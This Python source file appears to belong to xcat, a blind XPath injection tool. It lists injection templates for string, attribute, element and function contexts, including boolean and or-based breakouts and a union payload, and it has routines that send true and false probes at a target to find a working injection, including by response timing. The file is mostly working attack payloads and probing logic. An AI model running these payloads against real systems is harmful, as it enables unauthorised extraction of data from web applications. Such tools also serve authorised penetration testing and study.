import asyncio

from xpath import E

import click

from xcat.attack import AttackContext, Injection, check, timed_request, OracleNotDifferentialError

# A token chosen to be extremely unlikely to equal any real node value. The
# OR-based injectors inject `DUMMY' or ... or '` so the left-hand
# `field='DUMMY'` comparison is always false. This guarantees the injected
# expression — not the working value — controls the predicate, even if the
# operator passes a real/valid value, and the trailing `or '` swallows any
# remaining ANDed clause (e.g. `and password=...`) into a dead branch.
OR_DUMMY = 'xcatnomatch'

injectors = [
    Injection('integer',
              "/lib/book[id=?]",
              (
                  ('{working} and 1=1', True),
                  ('{working} and 1=2', False)
              ),
              "{working} and {expression}"),
    Injection('string - single quote',
              "/lib/book[name='?']",
              (
                  ("{working}' and '1'='1", True),
                  ("{working}' and '1'='2", False),
              ),
              "{working}' and {expression} and '1'='1"),
    Injection('string - single quote - or',
              "/lib/book[name='?'] (or-based, use with dummy value)",
              (
                  ("{working}' or true() and '1'='1", True),
                  ("{working}' or false() and '1'='1", False),
              ),
              "{working}' or {expression} and '1'='1"),
    Injection('string - double quote',
              '/lib/book[name="?"]',
              (
                  ('{working}" and "1"="1', True),
                  ('{working}" and "1"="2', False),
              ),
              '{working}" and {expression} and "1"="1'),
    Injection('string - double quote - or',
              '/lib/book[name="?"] (or-based, use with dummy value)',
              (
                  ('{working}" or true() and "1"="1', True),
                  ('{working}" or false() and "1"="1', False),
              ),
              '{working}" or {expression} and "1"="1'),
    Injection('string - single quote - double-or',
              "/lib/book[name='?' and pass='...'] (trailing-clause safe; isolates a dummy)",
              (
                  (OR_DUMMY + "' or true() or '", True),
                  (OR_DUMMY + "' or false() or '", False),
              ),
              OR_DUMMY + "' or {expression} or '"),
    Injection('string - double quote - double-or',
              '/lib/book[name="?" and pass="..."] (trailing-clause safe; isolates a dummy)',
              (
                  (OR_DUMMY + '" or true() or "', True),
                  (OR_DUMMY + '" or false() or "', False),
              ),
              OR_DUMMY + '" or {expression} or "'),
    Injection('attribute name - prefix',
              "/lib/book[?=value]",
              (
                  ("1=1 and {working}", True),
                  ("1=2 and {working}", False)
              ),
              lambda working, expression: expression & E(working)),
    Injection('attribute name - postfix',
              "/lib/book[?=value]",
              (
                  ("{working} and not 1=2 and {working}", True),
                  ("{working} and 1=2 and {working}", False)
              ),
              lambda working, expression: working & expression & E(working)),
    Injection('element name - prefix',
              "/lib/something?/",
              (
                  (".[true()]/{working}", True),
                  (".[false()]/{working}", False)
              ),
              lambda working, expression: E('.')[expression].add_path('/' + working)),
    Injection('element name - postfix',
              "/lib/?something",
              (
                  ("{working}[true()]", True),
                  ("{working}[false()]", False)
              ),
              lambda working, expression: E(working)[expression]),
    Injection('function call - last string parameter - single quote',
              "/lib/something[function(?)]",
              (
                  ("{working}') and true() and string('1'='1", True),
                  ("{working}') and false() and string('1'='1", False),
              ),
              "{working}') and {expression} and string('1'='1"),
    Injection('function call - last string parameter - double quote',
              "/lib/something[function(?)]",
              (
                  ('{working}") and true() and string("1"="1', True),
                  ('{working}") and false() and string("1"="1', False),
              ),
              '{working}") and {expression} and string("1"="1'),
    Injection('other elements - last string parameter - double quote',
              "/lib/something[function(?) and false()] | //*[?]",
              (
                  ('{working}") and false()] | //*[true() and string("1"="1', True),
                  ('{working}") and false()] | //*[false() and string("1"="1', False),
              ),
              '{working}") and false()] | //*[{expression} and string("1"="1')

]


async def detect_injections(context: 'AttackContext') -> list[Injection]:
    working_value = context.target_parameter_value

    returner = []
    all_results: list[bool] = []

    for injector in injectors:
        payloads = injector.test_payloads(working_value)
        result_futures = [
            check(context, test_payload)
            for test_payload, expected in payloads
        ]

        results = await asyncio.gather(*result_futures)
        all_results.extend(results)

        if all(result == expected for result, (_, expected) in zip(results, payloads)):
            returner.append(injector)

    # No injector matched. If the oracle returned the *same* answer for every
    # single probe it never differentiated true from false — that is a
    # misconfigured/saturated oracle, not (necessarily) a non-vulnerable target.
    # Surface that distinctly so the operator fixes the oracle instead of
    # assuming the target is safe. A *mixed* set of results means the oracle
    # works but no template fit, which stays the generic "no injections" case.
    if not returner and all_results and len(set(all_results)) == 1:
        raise OracleNotDifferentialError(all_results[0])

    return returner


async def detect_injections_timed(context: 'AttackContext') -> tuple[list[Injection], float]:
    """Detect injections using timing oracle.

    For each injector, sends true()+delay and false()+delay payloads.
    True should be slow (delay evaluates), false should be fast (short-circuited).

    Returns (detected_injections, calibrated_threshold).
    """
    working = context.target_parameter_value
    delay = context.time_delay_expr

    detected = []
    best_true_time = 0.0
    best_false_time = 0.0

    for injector in injectors:
        click.echo(f'  Testing: {injector.name}... ', nl=False)
        try:
            true_payload = str(injector(working, E(f"true() and {delay}")))
            false_payload = str(injector(working, E(f"false() and {delay}")))
        except Exception:
            click.echo(click.style('skip', 'yellow'))
            continue

        false_time = await timed_request(context, false_payload)
        true_time = await timed_request(context, true_payload)

        click.echo(f'false={false_time:.2f}s, true={true_time:.2f}s', nl=False)

        if true_time > false_time * 2 and true_time > 1.0:
            click.echo(click.style(' ← detected', 'green'))
            detected.append(injector)
            if true_time > best_true_time:
                best_true_time = true_time
                best_false_time = false_time
        else:
            click.echo()

    threshold = (best_true_time + best_false_time) / 2 if detected else 0.0
    return detected, threshold
